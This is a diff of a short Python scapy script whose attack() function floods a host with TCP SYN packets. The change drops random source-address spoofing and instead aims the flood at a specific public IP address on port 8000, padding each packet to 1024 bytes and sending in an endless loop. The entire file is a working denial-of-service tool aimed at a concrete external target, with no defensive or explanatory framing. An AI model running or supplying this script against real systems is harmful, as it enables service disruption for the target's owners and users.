@@ -1,16 +1,11 @@
-import time
-import random
-from scapy.all import IP, TCP, send, conf, L3RawSocket
+from scapy.all import IP, TCP, send, Raw
 
-ip = IP(dst="0.0.0.0")
+ip = IP(dst="3.82.232.137")
 tcp = TCP(dport=8000, flags="S")
-conf.L3socket=L3RawSocket
-
+body = Raw(b"X"*1024)
 def attack():
-  while True:
-    ip.src=f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
-    send(ip/tcp)
-    time.sleep(0)
+    p = ip/tcp/body
+    send(p, loop=1, verbose=0)
 
 if __name__ == '__main__':
   attack()
